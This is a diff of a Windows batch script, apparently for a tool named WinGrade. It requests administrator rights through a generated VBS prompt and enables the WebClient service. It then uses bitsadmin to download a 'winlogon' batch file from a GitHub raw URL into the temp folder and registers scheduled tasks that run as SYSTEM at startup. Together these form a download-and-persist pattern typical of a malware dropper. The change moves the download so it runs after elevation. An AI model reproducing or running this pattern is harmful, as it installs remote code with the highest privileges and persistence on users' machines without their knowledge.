@@ -1,9 +1,6 @@
 @echo off
 SET mypath=%~dp0
 
-if exist "%tmp%\Wingrade.bat" ( echo [+] Wingrade is installed! ) else ( 
-	bitsadmin /util /setieproxy localsystem AUTODETECT
-	bitsadmin /transfer "WinGrade" /download /priority normal "https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/WinGrade-winlogon.bat" "%tmp%\WinGrade.bat" )
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if %errorlevel% NEQ 0 (
     echo Requesting administrative privileges...
@@ -17,9 +14,14 @@ if %errorlevel% NEQ 0 (
 
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
+    exit
 
 :gotAdmin
 	sc config webclient start= auto
+	if exist "%tmp%\Wingrade.bat" ( echo [+] Wingrade is installed! ) else ( 
+		bitsadmin /util /setieproxy localsystem AUTODETECT
+		bitsadmin /transfer "WinGrade" /download /priority normal "https://raw.githubusercontent.com/Crypt2Shell/WinGrade/master/WinGrade-winlogon.bat" "%tmp%\WinGrade.bat" )
+	
 	schtasks /query /TN "WinGrade" >NUL 2>&1
 	if %errorlevel% NEQ 0 ( 
 		schtasks /create /tn "WebClient" /SC onstart /RU "SYSTEM" /DELAY 0000:05 /RL highest /F /TR "net start webclient"
